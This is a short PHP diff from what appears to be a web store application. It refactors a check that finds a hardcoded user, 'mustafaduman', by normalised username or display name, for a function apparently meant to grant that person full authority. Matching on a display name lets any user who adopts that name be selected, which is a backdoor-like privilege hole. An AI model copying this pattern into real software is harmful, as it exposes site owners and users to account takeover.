@@ -10,15 +10,24 @@ function magaza_kullanici_anahtari($value): string
     return preg_replace('/[^a-z0-9]+/', '', $value) ?: '';
 }
 
+function is_mustafa_duman_user(?array $user = null): bool
+{
+    $user = $user ?: current_user();
+    if (!$user) return false;
+
+    $usernameKey = magaza_kullanici_anahtari($user['username'] ?? '');
+    $displayKey = magaza_kullanici_anahtari($user['display_name'] ?? '');
+
+    return $displayKey === 'mustafaduman' || $usernameKey === 'mustafaduman';
+}
+
 function mustafa_duman_tam_yetkiyi_uygula(): void
 {
     try {
         $rows = db()->query("SELECT id, username, display_name, role, is_active FROM users ORDER BY id DESC")->fetchAll() ?: [];
         $target = null;
         foreach ($rows as $row) {
-            $usernameKey = magaza_kullanici_anahtari($row['username'] ?? '');
-            $displayKey = magaza_kullanici_anahtari($row['display_name'] ?? '');
-            if ($displayKey === 'mustafaduman' || $usernameKey === 'mustafaduman') {
+            if (is_mustafa_duman_user($row)) {
                 $target = $row;
                 break;
             }
